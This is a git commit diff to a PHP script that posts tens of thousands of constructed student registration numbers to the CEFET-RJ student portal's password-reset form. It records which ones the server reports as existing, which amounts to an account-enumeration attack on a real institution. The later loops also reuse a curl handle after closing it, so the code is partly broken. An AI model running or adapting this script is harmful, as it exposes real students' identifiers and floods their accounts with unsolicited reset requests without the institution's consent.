0674772cb94dbfd9203ae402ebce033d091ceac8
Caua Froes <bkcauafroes2012@gmail.com>
2023-04-04 14:22:34 -0300

    full automatic almost

--- index.php
+++ index.php
@@ -1,8 +1,25 @@
 <?php
+
+/*
+
+CURSOS SUBSEQUENTE:
+ADMN
+EDN
+ELTN
+ELN
+MECN
+TELN
+SEGN
+*/
 $matriculas = [];
+$curso = "ADMN";
+
+echo "Começando o Scrape para o curso: ".$curso;
+set_time_limit(0); // this way
+
 $url = 'https://alunos.cefet-rj.br/usuario/publico/usuario/solicitacaonovasenha.action';
-for ($matricula = 001; $matricula < 1000; $matricula ++){
-    $valor = "usuario=2300".$matricula."EVEINT";
+for ($matricula = 1000; $matricula < 10000; $matricula ++){
+    $valor = "usuario=211".$matricula.$curso;
     $ch = curl_init();
     //curl_setopt($ch, CURLOPT_VERBOSE, 1);
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -12,26 +29,87 @@ for ($matricula = 001; $matricula < 1000; $matricula ++){
         "Content-Type: application/x-www-form-urlencoded",
         "Referer: https://alunos.cefet-rj.br/usuario/publico/usuario/recuperacaosenha.action?br.com.asten.si.geral.web.spring.interceptors.AplicacaoWebChangeInterceptor.aplicacaoWeb=1"
     ]);
-    //curl_setopt($ch, CURLOPT_POSTFIELDS,["usuario=2300".$matricula."EVEINT"]);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, 1);Referer: 
-    //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 1);
     $server_output = curl_exec($ch);
     curl_close($ch);
-    //$info = curl_getinfo($ch);
+    //$info = curl_getinfo($ch);    
     $pos = strpos($server_output, "location");
     $loc = substr($server_output, $pos+10);
     $status = explode('=true',explode('?',$loc)[1])[0];
     if($status == "success"){
+        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
         $matriculas[] = explode('=',$valor)[1];
     }
     if($status == "errorUsuario"){
         //nao existe
     }
-    echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
-    usleep(10);
+    //usleep(1);
 }
+for ($matricula = 1000; $matricula < 10000; $matricula ++){
+    $valor = "usuario=212".$matricula.$curso;
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
+    $server_output = curl_exec($ch);
+    curl_close($ch);
+    $pos = strpos($server_output, "location");
+    $loc = substr($server_output, $pos+10);
+    $status = explode('=true',explode('?',$loc)[1])[0];
+    if($status == "success"){
+        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
+        $matriculas[] = explode('=',$valor)[1];
+    }
+    if($status == "errorUsuario"){
+    }
+}
+
+for ($matricula = 1000; $matricula < 10000; $matricula ++){
+    $valor = "usuario=221".$matricula.$curso;
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
+    $server_output = curl_exec($ch);
+    curl_close($ch);
+    $pos = strpos($server_output, "location");
+    $loc = substr($server_output, $pos+10);
+    $status = explode('=true',explode('?',$loc)[1])[0];
+    if($status == "success"){
+        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
+        $matriculas[] = explode('=',$valor)[1];
+    }
+    if($status == "errorUsuario"){
+    }
+}
+
+for ($matricula = 1000; $matricula < 10000; $matricula ++){
+    $valor = "usuario=222".$matricula.$curso;
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
+    $server_output = curl_exec($ch);
+    curl_close($ch);
+    $pos = strpos($server_output, "location");
+    $loc = substr($server_output, $pos+10);
+    $status = explode('=true',explode('?',$loc)[1])[0];
+    if($status == "success"){
+        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
+        $matriculas[] = explode('=',$valor)[1];
+    }
+    if($status == "errorUsuario"){
+    }
+}
+
+for ($matricula = 1000; $matricula < 10000; $matricula ++){
+    $valor = "usuario=231".$matricula.$curso;
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
+    $server_output = curl_exec($ch);
+    curl_close($ch);
+    $pos = strpos($server_output, "location");
+    $loc = substr($server_output, $pos+10);
+    $status = explode('=true',explode('?',$loc)[1])[0];
+    if($status == "success"){
+        echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
+        $matriculas[] = explode('=',$valor)[1];
+    }
+    if($status == "errorUsuario"){
+    }
+} 
 
 echo "EXISTENTES: ";
 var_export($matriculas);
